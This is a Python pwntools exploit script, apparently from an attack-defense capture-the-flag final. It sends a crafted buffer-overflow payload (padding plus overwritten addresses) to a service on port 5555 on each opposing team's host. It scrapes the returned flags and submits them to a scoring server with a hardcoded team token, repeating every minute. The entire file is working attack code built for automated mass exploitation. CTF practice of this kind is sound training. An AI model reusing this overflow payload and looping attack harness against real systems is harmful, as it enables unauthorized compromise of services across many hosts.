import requests
from pwn import *


def get_flags(teamid):
    num = randint(1000000, 9999999)

    bytes_array = f"{num}".encode() + b"A" * 65 + b"\x01\x1b\x40" + b"\x00" * 5 + b"\x10\x1b\x40" + b"\x00" * 5 + b"\x0a" * 3

    r = remote(f"10.10.{teamid}.1", 5555, timeout=10)

    r.recvuntil(b">> ")
    r.sendline(b"1")

    r.recvuntil(b"message id >> ")
    r.send(bytes_array)
    output = r.recvall(timeout=3)

    flags = []

    while True:
        index = output.find(b"flg{")
        if index == -1:
            break
        flags.append(output[index:index + 30].decode())
        output = output[index + 30:]

    return flags


def submit(flag):
    url = 'https://finals.cyberchallenge.it/submit'
    team_token = 'yZOgnjK2HcJAK2YZ'

    r = requests.post(url, data={'team_token': team_token, 'flag': flag})
    return "Flag accepted" in r.text


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


while True:

    for team in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 22, 23, 24, 25, 26, 27, 28]:
        print(f"Team {team}")
        try:
            flags = get_flags(team)
        except:
            continue
        for flag in flags:
            if submit(flag):
                print(bcolors.OKGREEN + f"\t\tFlag {flag} Accepted!" + bcolors.ENDC)
            else:
                print(bcolors.FAIL + f"\t\tFlag {flag} Rejected!" + bcolors.ENDC)

    print("Sleeping for 60 seconds...")
    time.sleep(60)
